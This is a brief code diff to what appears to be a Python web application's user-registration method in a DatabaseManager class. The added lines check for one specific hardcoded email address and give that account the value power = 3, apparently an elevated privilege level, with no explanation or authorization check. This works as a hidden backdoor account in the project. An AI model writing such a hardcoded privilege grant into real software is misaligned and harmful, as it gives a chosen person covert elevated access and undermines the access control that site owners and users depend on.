@@ -245,6 +245,8 @@ class DatabaseManager:
         with self.get_db() as db:
             try:
                 hashed_password = self.ph.hash(password)
+                if email == "timbyoficial@gmail.com":
+                    power = 3
                 new_user = User(
                     username=username,
                     email=email,
